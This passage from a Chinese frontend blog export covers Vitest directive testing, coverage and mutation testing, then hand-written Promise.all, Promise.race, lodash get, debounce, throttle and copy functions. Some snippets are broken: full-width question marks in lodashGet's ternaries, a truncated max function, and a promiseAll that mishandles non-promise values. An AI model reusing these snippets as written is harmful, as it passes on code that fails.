DX）有非常良好的體驗。\n但相對的來說，要測試客製化指令就有機會運用到各種我們至今學過的許多技巧來斷言，從而使難度大大提升，但我們只要熟悉之前的模擬技巧後，最後只需要關注的一個地方就是，預期指令放入後應達成什麼目標，接著再去尋找要從什麼角度或可取得的資訊去比對來作為我們斷言的內容即可。\n而接下來我們以一個 v-foucs 的客製化指令來介紹如何斷言客製化指令與尋找比對資訊：\n1 2 3 const vFocus = { mounted: (el) =\u0026gt; el.focus(), } 註冊指令 首先，要進行斷言我們可以透過容器中第二個參數的 global.directives 來註冊我們的客製化指令：\n1 2 3 4 5 6 7 const wrapper = mount(..., { global: { directives: { Focus: vFocus, // 屬性匹配的名稱規則 Abc 會 match 到 v-abc }, }, }) 仿造元件並放入指令 接著我們要使用到仿造元件的技巧，讓容器一開始就載入一個假的元件，並且放入指令與 data-test 屬性供捕獲：\n1 2 3 4 5 6 7 8 9 10 const Component = { template: \u0026#39;\u0026lt;input v-focus data-test=\u0026#34;target\u0026#34; type=\u0026#34;text\u0026#34;/\u0026gt;\u0026#39;, } const wrapper = mount(..., { global: { directives: { Focus: vFocus, }, }, }) 尋找比對目標 再來，由於目標是為了驗證是否該元素為瀏覽器中的 focus 元素，因此要利用到瀏覽器物件 Document 中的 activeElement 屬性，若有被聚焦的情況下那應該要能夠比對到同個元素。（由 jsdom 提供模擬的瀏覽器環境）\n斷言 最後在斷言的部分，為了取得目標元素，我們可以透過 wrapper.find().element 取得目標的元素實體，最後就可以拿他與 document.activeElement 做比對：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 it(\u0026#39;v-focus\u0026#39;, async () =\u0026gt; { const Component = { template: \u0026#39;\u0026lt;input v-focus data-test=\u0026#34;target\u0026#34; type=\u0026#34;text\u0026#34;/\u0026gt;\u0026#39;, } const wrapper = mount(Component, { attachTo: document.body, global: { directives: { Focus: vFocus, }, }, }) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).element).toBe(document.activeElement) }) 如此一來我們就可以確保將來在使用 v-focus 指令時，該元素在 mounted 後會是聚焦的元素。\nVitest UI Vitest UI\nVitest UI 簡單來說，是另一種供我們查看測試與編寫測試的方式，它的特色在於基於 Vite 的 dev server 環境，讓我們可以直接在瀏覽器上直接觀看測試案例的測試結果，甚至支援直接在瀏覽器中編寫測試案例後同步更新測試檔案。\n而在使用這項酷酷的功能之前，我們需要另外安裝 @vitest/ui：\n1 npm i -D @vitest/ui 接著就可以在 package.json 中新增一個 vitest 指令，並帶上參數 --ui：\n1 2 3 4 5 { \u0026#34;scripts\u0026#34;: { \u0026#34;vitest:ui\u0026#34;: \u0026#34;vitest --ui\u0026#34; } } 如此一來後們只要執行 npm run vitest:ui，就可以在啟動這項功能，並看到下列畫面：\n介面 在 Vitest UI 中，左側是所有測試案例的測試結果（Pass / Fail / Skip），我們可以透過上方的搜尋欄輸入檔名或路徑找到我們要觀察的測試。\n點擊左側的測試路徑後，右側會出現測試情境與測試案例的描述讓我們更好觀察當下檔案中的所有案例\n除此之外，再往右側會看到四項資訊，分別為：\nReport（預設顯示項目） Module Graph Console Code Report 點擊 Report 頁籤時，會在右側顯示該測試檔案中的所有測試案例結果。\n若為全通過的情況會顯示 All tests passed in this file：\n若有錯誤會顯示是哪一條測試案例發生錯誤：\n我們甚至能點擊錯誤訊息右方的開啟視窗 Icon，Vitest UI 將會直接啟動系統預設的程式碼編輯器，開啟測試檔案後將輸入游標聚焦在錯誤的行數與位置。（e.g. 圖中的 toEqual Assertion Matcher）\nModule Graph 接著是第二個頁籤的 Module Graph，這頁的內容主要是透過檢測行內引入模組，呈現檔案之間依賴關係。\n點擊圖中的節點可以看到該模組的 Source 檔與經由 Transformed 後的程式碼。\n而這個圖表最大的用處在於，透過可視化的方式呈現出測試程式碼中受測物（SUT）與依賴物（DOC）的依賴狀況。\nConsole Console 頁籤主要是顯示在測試程式碼中的 console.log 資訊，由於與測試結果分離的情況下，相較於在終端機中觀察 Console，這裡會顯示得更加清楚。\nCode 最後壓軸介紹的部分，則是 Code 頁籤，你可能會覺得這有什麼特別的，不就是顯示測試檔案程式碼嗎？\n然而，這裡的測試程式碼除了預覽之外，還能夠直接在瀏覽器中直接編寫並執行測試查看結果，更重要的是寫完的當下按下儲存它還能夠同步調整到實際的程式碼中！\n比方在瀏覽器中的測試程式碼中加個註解，並儲存：\n實際測試程式碼檔案也加上了註解！\n如此一來，我們就可以直接在這個視窗內撰寫我們的測試案例，並且在瀏覽器中即時看到測試結果。\n不過這裡有個小小缺點是，若在專案中有設定 eslint + prettier 的話，在程式編輯器撰寫測試時可以設定儲存當下的自動做格式化，但是瀏覽器中的編輯器環境不同，所以寫測試時會收到格式錯誤的警告，但在不考慮這點的情況下，這個工具是個用來檢視測試結果與依賴關係的好工具。\n程式碼覆蓋率（Code Coverage） 在測試領域中，覆蓋率（Coverage）一詞泛指的是以百分比表示測試程式碼能夠涵蓋多少產品程式碼的範圍，而依據不同的覆蓋率種類，其細微的定義也會有所不同。\n接下來我們以覆蓋率工具庫 c8 來說明覆蓋率的概念與如何透過 c8 在 Vitest 測試環境中檢視當下的測試覆蓋率，最後再來談談有關於覆蓋率的相關議題。\nc8 要在 Vitest 測試環境中使用 c8 產生覆蓋率報告，我們首先需要安裝 @vitest/coverage-c8：\n1 npm i -D @vitest/coverage-c8 接著就可以在 package.json 中新增指令：\n1 2 3 4 5 { \u0026#34;scripts\u0026#34;: { \u0026#34;test:coverage\u0026#34;: \u0026#34;vitest --environment jsdom --coverage\u0026#34; } } 執行 npm run test:coverage 後，預設會在終端機產生出覆蓋率報告：\n而 c8 覆蓋率報告總共有四種類型：\n行數覆蓋率（line coverage）：以行數為單位來計算。 函式覆蓋率（function coverage）：以內部的函式為單位來計算。 分枝覆蓋率（branch coverage）：以每個判斷式為單位來計算。 語句覆蓋率（statement coverage）：以每個語句（statement）為單位計算。 測試程式碼涵蓋多少範圍的產品程式碼，甚至於每行程式碼個被執行了幾次\n並且若有未覆蓋行數的情況， c8 則會在 Uncovered Line 中顯示未涵蓋的行數範圍，如下圖中的 13-17、19-28\n倘若你覺得這種報告形式不方便觀看，或是希望將它製作成文件，則可以在 config.js 檔中設定 coverage.reporter 的形式：\n1 2 3 4 5 6 7 8 // vite.config.js or vitest.config.js export default defineConfig({ test: { coverage: { reporter: [\u0026#39;text\u0026#39;, \u0026#39;json\u0026#39;, \u0026#39;html\u0026#39;], }, }, }) 其中 c8 提供的報告（reporter）選項有以下三種：\ntext： 在終端機中呈現覆蓋率報告。 json： 以 JSON 格式產生覆蓋率報告。 html： 產生一個可互動的 HTML 覆蓋率報告。 其中 HTML 的版本中，我們還可以點擊測試檔案來查看未覆蓋的行數有哪些，相較終端機的版本，我們就不必再拿著行數去對程式碼了：\n覆蓋率目標 而在瞭解怎麼查看覆蓋率報告後，那麼究竟覆蓋率目標要達到多少才是合理呢？\n以 《可測試的 JavaScript》一書作者 Mark Ethan Trostler 提供的答案是單元測試大約要介於 80 % 左右。\n以 Martin Fowler 於 Test Coverage 一文中，則是指出大約會在於 80 至 90 % 附近。\n至於為什麼不是達到百分之百呢？接下來我們來探討有關於覆蓋率相關的議題。\n覆蓋率議題 覆蓋率與付出的心力 雖然以理論上來說盡可能得達到高覆蓋率，測試程式碼將涵蓋的越完全，然而為了追求 100 % 的覆蓋率所要付出的心理將會截然不同。\nJeroen Mols 在 The 100% code coverage problem 一文中的提到了心力付出與覆蓋率的關係表。\n引用自 Jeroen Mols 《The 100% code coverage problem》一文中的圖\n從上圖中可以看見，在覆蓋率從 0 提升至 80% 我們僅需要付出一些心力就可以輕易達成，然而要將 90% 提升至接近 100% 我們則幾乎要投入兩到三倍以上的心力才能完成。\n因此，有些人雖然會認為 100% 的覆蓋率是一個不錯的目標，但是在實際上，我們可能會因為追求 100% 的覆蓋率而付出過多的心力，而導致測試程式碼的品質反而變差。\n覆蓋率 100% 的誤區 在費盡千辛萬苦後，我們終於達到了 100% 覆蓋率的情況了。\n然而，100 % 的覆蓋率僅能代表測試程式碼完整（Complete）的覆蓋了產品程式碼，並非代表測試程式碼的品質達到完美（Perfect），接下來我們用個簡單的例子來說明：\n1 2 3 4 5 const max = (x, y) =\u0026gt; return x test(\u0026#39;max\u0026#39;, () =\u0026gt; { expect(max(2, 1)).toBe(2) }) 在上方案例中，我們可以看見 max 測試案例基本上已經完全覆蓋了 max 函式的實作情況，而我們可以從這個案例中看出兩個問題：\n產品程式碼本身有問題，即便測試程式碼覆蓋了 100% 的情況下，產品程式碼本身仍然是有問題的。 測試程式碼案例與路徑不足，導致覆蓋率為 100% 的情況下，並沒有測出產品程式碼中的問題與邊際案例（edge case）。 因此覆蓋率 100% 充其量只是一個指標，用來告訴我們測試程式碼是否完整的覆蓋了產品程式碼，而非「完全沒有問題」。\n倘若我們想要盡可能避免這種情況的發生，這時我們就可以透過突變測試（Mutation Testing）來協助我們。\n突變測試（mutation testing） 突變測試（Mutation Testing）是一種驗證與改善測試程式碼的測試方法，概念上來說，他會盡可能的抽換產品程式碼中的每個角落，接著依照抽換規則來預期測試程式碼的檢測結果。\n假設我們有個比較函式如下：\n1 const greaterThan = (x, y) =\u0026gt; x \u0026gt; y 而這時我們測試程式碼可能會這麼處理：\n1 2 3 4 5 6 7 8 9 10 it(\u0026#39;should return true if x is greater than y\u0026#39;, () =\u0026gt; { expect(greaterThan(2, 1)).toBe(true) expect(greaterThan(0, -1)).toBe(true) expect(greaterThan(100, 0)).toBe(true) }) it(\u0026#39;should return false if x is less than y\u0026#39;, () =\u0026gt; { expect(greaterThan(1, 2)).toBe(false) expect(greaterThan(-1, 0)).toBe(false) expect(greaterThan(0, 100)).toBe(false) }) 接著突變測試可能會將 greaterThan 函式中的 \u0026gt; 符號替換成 \u0026gt;= 符號，此時理論上來說應該會有測試案例失敗，但是實際上測試程式碼卻沒有檢測到這個問題，那就表示我們的測試程式碼並沒有覆蓋到這個案例。\n此時我們就可以針對這種情況，再補上對應的測試案例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 it(\u0026#39;should return true if x is greater than y\u0026#39;, () =\u0026gt; { expect(greaterThan(2, 1)).toBe(true) expect(greaterThan(0, -1)).toBe(true) expect(greaterThan(100, 0)).toBe(true) }) it(\u0026#39;should return false if x is less than y\u0026#39;, () =\u0026gt; { expect(greaterThan(1, 2)).toBe(false) expect(greaterThan(-1, 0)).toBe(false) expect(greaterThan(0, 100)).toBe(false) }) // 新增案例 it(\u0026#39;should return false if x is equal y\u0026#39;, () =\u0026gt; { expect(greaterThan(1, 1)).toBe(false) }) 接著突變測試再度將 \u0026gt; 符號替換成各種符號（e.g. \u0026lt;=），甚至是將 {} 語句（statement）清空，而諸如此類的手法，就是突變測試的核心概念。\n若想手動置換產品程式碼中的符號，可以從這些方法下手\noperator: +, -, *, / condition: \u0026lt;, \u0026gt;, \u0026lt;=, \u0026gt;=, ==, ===, !=, !== statement: {}, if, else, for, return, throw, try, catch expression: \u0026amp;\u0026amp;, ||, ! 突變測試的工具 雖然說我們可以手動置換產品程式碼中的各種符號，但是這樣的作法會讓我們的工作量變得非常龐大，因此我們可以透過工具來協助我們完成這些工作。\n以前端領域來說，我們可以透過 Stryker Mutator 底下的 stryker-js 工具來完成這些工作。\nStryker Mutator 的概念就是透過替換不同的符號產生出突變的內容，而我們的測試程式碼應該要捕捉到那些不合理的情況，藉此來保證我們的測試案例有一定的穩固性。\n然而，可惜的是 stryker-js 目前僅支援到 Jest 環境，尚未支援 Vitest 的環境，因此我這邊就暫不做介紹了，有興趣者可以追蹤該 issue 目前的最新進度。\n","date":"2022-12-29T00:00:00Z","image":"https://madewithnetworkfra.fra1.digitaloceanspaces.com/spatie-space-production/29079/vitest.jpg","permalink":"https://wayneblog.ga/2022-12-29/vitest-unit-test/","title":"闡述單元測試、元件測試，並學習在自己的 Vue3 專案中加入 Vitest！"},{"content":" 參考網站\n前端手寫題是許多面試會考的題型，從最基本上的各類效用函式 (例如 debounce、curry、deepClone 等等)，到常見的 JavaScript 方法 (例如 Promise.all)，都不能只會用，還要會自己手寫出來。\n本篇文章將會節錄常見的手寫題目，並附上解答。除此之外，每一題都有詳細解說，供讀者們參考。\nPromise.all Promise.all() 是什麼？ 要實現這個方法前，我們要先知道它在做什麼。根據 MDN 的定義，Promise.all() 會：\n接收一個內有多個 promises 的 Iterable ，例如 Array、Map、Set。 如果 Iterable 是空的，例如空 Array，則 fulfilled 值會是空的 Array。 如果 Iterable 不是空的，則如果所有的 promises 都 fulfilled，則依序回傳 fulfilled 的值；如果其中有一個 promise 被 rejected，則會馬上 reject。 1 2 3 4 5 6 7 8 9 10 const promise1 = Promise.resolve(3); const promise2 = 42; const promise3 = new Promise((resolve, reject) =\u0026gt; { setTimeout(resolve, 100, \u0026#39;foo\u0026#39;); }); Promise.all([promise1, promise2, promise3]).then((values) =\u0026gt; { console.log(values); }); // expected output: Array [3, 42, \u0026#34;foo\u0026#34;] 如何實現簡單版的 Promise.all() 在實現完整版之前，我們先以一個僅處理 Array 的 Promise.all 為例子，了解如何實現核心概念，往下再進一步探討如何處理 Iterable。我們先直接看程式碼，看看你能了解多少。有不懂的地方也不擔心，下面會透過註解，一行行解釋：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 function promiseAll(promises) { if (!Array.isArray(promises)) { return new TypeError(\u0026#39;Arguments must be an array\u0026#39;); } if (promises.length === 0) { return Promise.resolve([]); } const outputs = []; let resolveCounter = 0; return new Promise((resolve, reject) =\u0026gt; { promises.forEach((promise, index) =\u0026gt; { promise .then((value) =\u0026gt; { outputs[index] = value; resolveCounter += 1; if (resolveCounter === promises.length) { resolve(outputs); } }) .catch(reject); }); }); } 讓我們透過以下程式碼與註解來看如何實現吧：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 function promiseAll(promises) { // 先檢查輸入是不是 array，如果不是的話就回傳錯誤 if (!Array.isArray(promises)) { return new TypeError(\u0026#39;Arguments must be an array\u0026#39;); } // 定義中有提到，如果輸入是空的，例如空 array，就 resolve 一個空 array if (promises.length === 0) { return Promise.resolve([]); } // 先宣告一個最終要 resolve 的 outputs，之後每個 promise 被 fulfilled 時，就放到 outputs 裡面 const outputs = []; // 我們需要這個 counter 讓我們知道有多少個 promise 已經 fulfilled let resolveCounter = 0; // Promise.all() 最終要回傳一個 promise return new Promise((resolve, reject) =\u0026gt; { promises.forEach((promise, index) =\u0026gt; { promise .then((value) =\u0026gt; { // 當輸入的每個 promise 成功 fulfilled 時，就放到 outputs // 透過 index，我們可以確保順序正確 outputs[index] = value; // 每次成功放入時，counter 要加一 resolveCounter += 1; // 當 counter 等於 promises 的長度時，代表所有的 promise 都 fulfilled // 這時最外面的 promise 就可以 resolve if (resolveCounter === promises.length) { resolve(outputs); } }) .catch(reject); // 如果有任何一個 reject，就直接 reject }); }); } 實現完整版的 Promise.all() 上面這個版本的 Promise.all() 只有處理 Array 這種輸入，但實際上的 Promise.all() 是能接收所有的 Iterable，因此我們可以進一步優化上面的版本(備註：在面試中能寫出上面的版本，基本上要過關是沒問題，當然如果想在面試中展現自己的細心度，那麼進一步優化是更好的選擇)。\n先想想，如果要處理任意的 Iterable 可以怎麼做？我們可以先判斷丟進來的輸入是不是可以迭代的，如果不是的話，就提早回傳錯誤。\n1 2 3 4 5 6 7 const isIterable = ((typeof promises === \u0026#39;object\u0026#39; \u0026amp;\u0026amp; promises !== null) || typeof promises === \u0026#39;string\u0026#39;) \u0026amp;\u0026amp; typeof promises[Symbol.iterator] === \u0026#39;function\u0026#39;; if (!isIterable) { return new TypeError(\u0026#39;Arguments must be iterable\u0026#39;); } 基本上多了上述步驟的處理，剩下的邏輯就跟 Array 版本的差不多，程式碼如下(不同之處會有註解)：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 function promiseAll(promises) { // 判斷輸入是否為 Iterable const isIterable = ((typeof promises === \u0026#39;object\u0026#39; \u0026amp;\u0026amp; promises !== null) || typeof promises === \u0026#39;string\u0026#39;) \u0026amp;\u0026amp; typeof promises[Symbol.iterator] === \u0026#39;function\u0026#39;; // 不是的話就回傳錯誤訊息 if (!isIterable) { return new TypeError(\u0026#39;Arguments must be iterable\u0026#39;); } // 把 Iterable 轉成 Array，就可以重複用 Array 版的邏輯 promises = Array.from(promises); if (promises.length === 0) { return Promise.resolve([]); } const outputs = []; let resolveCounter = 0; return new Promise((resolve, reject) =\u0026gt; { promises.forEach((promise, index) =\u0026gt; { promise .then((value) =\u0026gt; { outputs[index] = value; resolveCounter += 1; if (resolveCounter === promises.length) { resolve(outputs); } }) .catch((e) =\u0026gt; { // 或是只要有 reject 的，就馬上 reject reject(e); }); }); }); } Promise.race() Promise.race() 是什麼？ 要實現這個方法前，我們要先知道它在做什麼。根據 MDN 的定義，Promise.race() 會\n接收一個內有多個 promises 的 Iterable，例如 Array、Map、Set 回傳最先 fulfill 或最先被 reject 的那一個 如何實現 Promise.race() 我們先直接看程式碼，看看你能了解多少。有不懂的地方也不擔心，下面會透過註解，一行行解釋：\n1 2 3 4 5 6 7 8 9 10 11 function promiseRace(promises) { return new Promise((resolve, reject) =\u0026gt; { for (const p of promises) { p.then((val) =\u0026gt; { resolve(val); }).catch((e) =\u0026gt; { reject(e); }); } }); } 讓我們透過以下程式碼與註解來看如何實現吧：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 function promiseRace(promises) { return new Promise((resolve, reject) =\u0026gt; { // 迭代過 promises for (const p of promises) { p.then((val) =\u0026gt; { // 只要有 fulfill 的，就馬上 resolve resolve(val); }).catch((e) =\u0026gt; { // 或是只要有 reject 的，就馬上 reject reject(e); }); } }); } Lodash 的 .get() Lodash 的 .get() 在做什麼？ .get() 是很常被用到的一個效用函式，他做的事情是給定一個物件，以及某個路徑，要回傳此路徑的值；如果該路徑不存在於給定的物件，則返回預設值。透過例子會比較好理解 (以下例子來自 Lodash 原始碼)\n1 2 3 4 5 6 7 8 9 10 const object = { a: [{ b: { c: 3 } }] }; //=\u0026gt; 3 get(object, \u0026#39;a[0].b.c\u0026#39;); //=\u0026gt; 3 get(object, \u0026#39;a[0][\u0026#34;b\u0026#34;][\u0026#34;c\u0026#34;]\u0026#39;); //=\u0026gt; \u0026#39;default get(object, \u0026#39;a[100].b.c\u0026#39;, \u0026#39;default\u0026#39;); 從上面的例子可以看到 Lodash 這個函式庫，可以接收各種類型的路徑，主要是原始碼當中有 castPath 這個 helper function。castPath 會把上面的 \u0026quot;a[0].b.c\u0026quot;、'a[0][\u0026quot;b\u0026quot;][\u0026quot;c\u0026quot;]' 以及 \u0026quot;a[100].b.c\u0026quot; 都轉成好處理的 ['a', '0', 'b', 'c']。\n因此，如果給定有內建的 castPath，.get() 實際在做的事情是：\n1 2 3 4 5 // 給定一個物件，例如 const object = { a: [{ b: { c: 3 } }] }; // 給一個路徑，透過 .get() 找到該路徑的值，例如 get(object, [\u0026#39;a\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;]); // 回傳 3 如何實現 .get() 一起來看看如何實現 .get()：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 function lodashGet(object, path, defaultValue) { // 先確認傳進來的 object 不是 null，如果是則直接回傳 defaultValue if (object == null) { return defaultValue; } let count = 0; const length = path.length; // 依循路徑一層層走過該物件，以上面的例子來說，會是 // path[0] 為 \u0026#39;a\u0026#39;，所以第一次迴圈 object 會變成 object[\u0026#39;a\u0026#39;] 也就是 [{ b: { c: 3 } }] // 第一次迴圈後，count 加 1，所以變成 object[path[1]] // 也就是 [object[\u0026#39;0\u0026#39;]]，意即 { b: { c: 3 } } // 接著 count 再加一，所以 object 會成為 object[path[2]] // 也就是 object[\u0026#39;b\u0026#39;]，意即 { c: 3 } // 接著 count 再加一，所以 object 會成為 object[path[3]] // 也就是 object[\u0026#39;c\u0026#39;]，意即 3 // 這時 count 為 4，由於 length 也是 4，因為 4 不小於 4，所以跳出迴圈 while (object != null \u0026amp;\u0026amp; count \u0026lt; length) { object = object[path[count++]]; } // 因為上面如果 object 是 null 的話，在走完 length 長度前，就會跳出 while 迴圈 // 這種情況下，就代表依循該路徑，會找不到值，所以會是 undefined // 舉例來說，如果 path 是 [\u0026#39;a\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;] // 因為 object[\u0026#39;1\u0026#39;] 會是 undefined，所以這時 while 迴圈會在 count 為 2 時終止 // 這種情況下就會是 count \u0026lt; length，所以當 count \u0026lt; length，result 會是 undefined const result = count \u0026amp;\u0026amp; count == length ？ object : undefined; // 如果 result 是 undefined，代表依循該路徑，會找不到值，所以回傳預設值 // 如果依循路徑有找到值，就回傳 result return result === undefined ？ defaultValue : result; } 防抖函式(debounce) 防抖(debounce) 和節流(throttle) 絕對是在考手寫題時最常出現的前幾名，這兩者都能做到優化，但使用情境不太相同。\n防抖(debounce)在做什麼？ 防抖函式(debounce)是指，將多次操作優化為：只在最後一次執行。\n具體來說，當一定時間內沒有持續觸發事件時，事件處理函式才會被執行一次，但如果在設定的時間內又一次觸發了事件，就會重新開始計時。\n在手寫**防抖(debounce)**函式前，我們先來了解防抖的使用情境。\n我們以 Google 搜尋框和搜尋建議列表為例子。畫面如下，有一個搜尋框，和一個搜尋建議列表，使用者在此搜尋框輸入文字後，搜尋建議列表會即時呈現結果; 搜尋框的文字只要一改變，搜尋建議列表也會即時更新結果。\n這樣看起來是很理想的設計吧？但首先要去解決一個問題：如果使用者一直在搜尋框內書寫文字，這樣會一直觸發 API 去更新搜尋建議列表，例如使用者想搜尋 javascript，這時 API 也及時觸發，所以此 API 會被觸發 10 次，而且前 9 次不會是使用這想要的結果。\n為了提升使用者體驗以及優化程式嗎，這一段功能我們就可以透過**防抖(debounce)**來優化。\n防抖函式會接受兩個參數：\n延遲的時間(ms) 要執行的函式 以上面搜尋框的例子來說，我們透過防抖就可以完成：當使用者停止在搜尋框內打入文字超過一定的時間，此時才會去執行觸發 API 的函式。\n如何實現防抖函式(debounce) 我們先直接看程式碼，看看你能了解多少。有不懂的地方也不擔心，下面會透過註解，一行行解釋：\n1 2 3 4 5 6 7 8 9 10 function debounce(fn, delay = 500) { let timer; return (...args) =\u0026gt; { clearTimeout(timer); timer = setTimeout(() =\u0026gt; { fn(...args); }, delay); }; } 程式碼註解版本和實際應用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // debounce function 接受兩個參數 // 一是：要執行的 function // 二是：要延遲的豪秒數，這邊預設 500 毫秒 function debounce(fn, delay = 500) { let timer; // debounce function 最終會回傳一個 function return (...args) =\u0026gt; { // 每一次 debounce function 被觸發時，會先清除之前的 timer，避免觸發先前的 fn 函式 // 因此只要在 delay 時間內觸發 debounce function，就會一直清除先前的 timer，避免 fn 一直被執行 clearTimeout(timer); // 清除之後，再重新計時 // 當 delay 時間到時，執行 fn timer = setTimeout(() =\u0026gt; { fn(...args); }, delay); }; } // updateDebounceText 會在延遲 500 ms 後執行 console.log(\u0026#39;call api get search result\u0026#39;) const updateDebounceText = debounce((text) =\u0026gt; { console.log(\u0026#39;call api get search result\u0026#39;); }, 500); // 搜尋框監聽 input 事件，當 input 改變時 // 觸發 updateDebounceText 函式 searchInput.addEventListener(\u0026#39;input\u0026#39;, (e) =\u0026gt; { updateDebounceText(e.target.value); }); 節流函式(throttle) 節流(throttle)在做什麼？ **節流(throttle)**指的是，在一段時間內只會執行一次觸發事件的回調函式(callback)，若在這之中又有新事件觸發，則不執行此回調函式。\n在手寫**節流函式(throttle)**前，我們先來了解節流的使用情境。\n監聽滾動事件，是搭配節流的使用場景之一。舉例來說：要判斷使用者是否已經滑動到頁面的 30% 處，當到達時會觸發一些動畫效果，因此會透過監聽滾動事件時，計算是否已到達該位置，但如果只要一滾動就計算會非常消耗性能，透過**節流(throttle)**可以將計算的這個回調函式在固定時間內合併一次被執行。\n這裡不適合使用防抖的原因是，防抖只會在事件停止被觸發後的一段時間內被執行一次。因此如果用防抖，當使用者一直滑動頁面，函式就永遠不會被觸發。這邊我們仍想要函式在滑動過程中被觸發，只是不想那麼頻繁被觸發，這種情境下，節流就可以派上用場。\n**節流函式(throttle)**會接受兩個參數：\n延遲的時間(ms) 要執行的回調函式(callback) 如何實現節流函式(throttle) 我們先直接看程式碼，看看你能了解多少。有不懂的地方也不擔心，下面會透過註解，一行行解釋：\n1 2 3 4 5 6 7 8 9 10 11 function throttle(fn, delay = 500) { let timer = null; return (...args) =\u0026gt; { if (timer) return; timer = setTimeout(() =\u0026gt; { fn(...args); timer = null; }, delay); }; } 程式碼註解版本和實際應用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 function throttle(fn, delay = 500) { let timer = null; // throttle 本身會回傳一個函式，透過 ...args 拿到該函式的引數 return (...args) =\u0026gt; { // 如果有計時器，表示還在 delay 的秒數內 // 直接 return，不往下執行程式碼 if (timer) return; // 如果計時器不等於 null，會進到以下邏輯 // 設定計時器，在 delay 秒數之後，會執行回調函式 fn，並將計時器值為改為 null // 如果還不到 delay 的秒數，則 timer 的值不為 null，不會進到這段邏輯 // 可以達到 throttle 的目的，將一段時間內的操作，集合成一次執行 timer = setTimeout(() =\u0026gt; { fn(...args); timer = null; }, delay); }; } const updateThrottleText = throttle(() =\u0026gt; { console.log(\u0026#39;throttle\u0026#39;); }, 500); // 如果一直滑動畫面，會固定 500ms console.log(\u0026#39;throttle\u0026#39;) window.addEventListener(\u0026#39;scroll\u0026#39;, () =\u0026gt; { updateThrottleText(); }); 淺拷貝(shallow copy)與深拷貝(deep copy) 在 JavaScript 複製值時，當複製的是非**原始型別(primitive type)**的資料型別時，例如：物件(object)、**數組(array)**等，會遇到淺拷貝(shallow copy)和深拷貝(deep copy)的差異。在面試時被問到這兩者的差異，你會怎麼回答？如果要你當場手寫深拷貝，你會怎麼寫？\n比較淺拷貝(shallow copy) 和深拷貝(deep copy) 淺拷貝是指複製值時，原本的變數和新的變數會指向同一個址(reference)，換句話說，如果拷貝的物件內容有改變，原本的物件也會被改變。\n以下程式碼是一個簡單的例子。\n定義一個新變數 objB，並將其值賦予為 objA，此時改變 objB 也會同時改變 objA，因為這兩個變數是共享同一個址(reference)。\n1 2 3 4 5 6 7 8 9 10 11 let objA = { a: 1, b: 2, }; let objB = objA; objB.a = 3; // 因為是淺拷貝，objA 的 a 也會被改變 console.log(objA); //{a:3, b:2} console.log(objB); //{a:3, b:2} 相反地，深拷貝是指在拷貝時不共享相同的址(reference)。\n以上面的例子，如果 objB 是透過深拷貝創建出來，當我們在更改 objB 的值時，並不用擔心 objA 的值會同樣被更動到。\n補充說明，在拷貝值時，有可能會遇到變數是多層的情境，例如是一個物件裡還有物件，深拷貝的定義會是每一層的值都不會共享址(reference)。以 lodash 這個套件提供的效用函式舉例，也是分成 clone 和 cloneDeep 兩種不同效用函式，clone 只用於淺拷貝(第一層拷貝)，但 cloneDeep 可用於深拷貝。\n1 2 3 4 5 6 7 8 9 10 11 // lodash 的淺拷貝 clone var objects = [{ a: 1 }, { b: 2 }]; var shallow = _.clone(objects); console.log(objects === shallow); // false console.log(shallow[0] === objects[0]); // true // lodash 的深拷貝 cloneDeep var objects = [{ a: 1 }, { b: 2 }]; var deep = _.cloneDeep(objects); console.log(objects === deep); // false console.log(deep[0] === objects[0]); // false 在說明完淺拷貝與深拷貝的差別後，常見的接續問題是「手寫」淺拷貝與深拷貝。\n假如你不確定怎麼手寫這兩種拷貝方式，可以繼續往下看。\n如何實現淺拷貝(shallow copy) 方法一：手動複製值 1 2 3 4 5 6 7 8 9 let objA = { a: 1, b: { c: 3 }, }; let objB = { a: objA.a, b: objA.b }; console.log(objA === objB); // false console.log(objA.b === objB.b); // true, 第二層的物件還是指向相同位置 方法二：使用 spread syntax 1 2 3 4 5 6 7 8 9 let objA = { a: 1, b: { c: 3 }, }; let objB = { ...objA }; console.log(objA === objB); // false console.log(objA.b === objB.b); // true, 第二層的物件還是指向相同位置 方法三：使用 Object.assign 1 2 3 4 5 6 7 8 9 let objA = { a: 1, b: { c: 3 }, }; let objB = Object.assign({}, objA); console.log(objA === objB); // false console.log(objA.b === objB.b); // true, 第二層的物件還是指向相同位置 如何實現深拷貝(deep copy) 方法一：使用 JSON.parse(JSON.stringify(...)) 這個作法是先將物件用 JSON.stringify 序列化為 string，再透過 JSON.parse 反序列化轉換回物件。\n要特別注意，這做法只能用於可序列化的物件，有些無法序列化的物件例如：function、HTML 的元素，這些是無法序列化的！所以執行前，需要先確認是否可以序列化，否則在執行 JSON.stringify 時會失敗。\n1 2 3 4 5 6 7 8 9 10 11 12 13 let objA = { a: 1, b: { c: 3 }, }; function deepCopy(item) { return JSON.parse(JSON.stringify(item)); } let objB = deepCopy(objA); console.log(objA === objB); // false console.log(objA.b === objB.b); // false 方法二：使用 structuredClone(value) 針對可序列化的物件，有另外一種透過 JavaScript 內建的方法達成深拷貝。這種方法是 structuredClone(value)，用法如下：\n1 2 3 4 5 6 7 8 9 let objA = { a: 1, b: { c: 3 }, }; let objB = structuredClone(objA); console.log(objA === objB); // false console.log(objA.b === objB.b); // false 方法三：考慮多重情況的遞迴式深拷貝 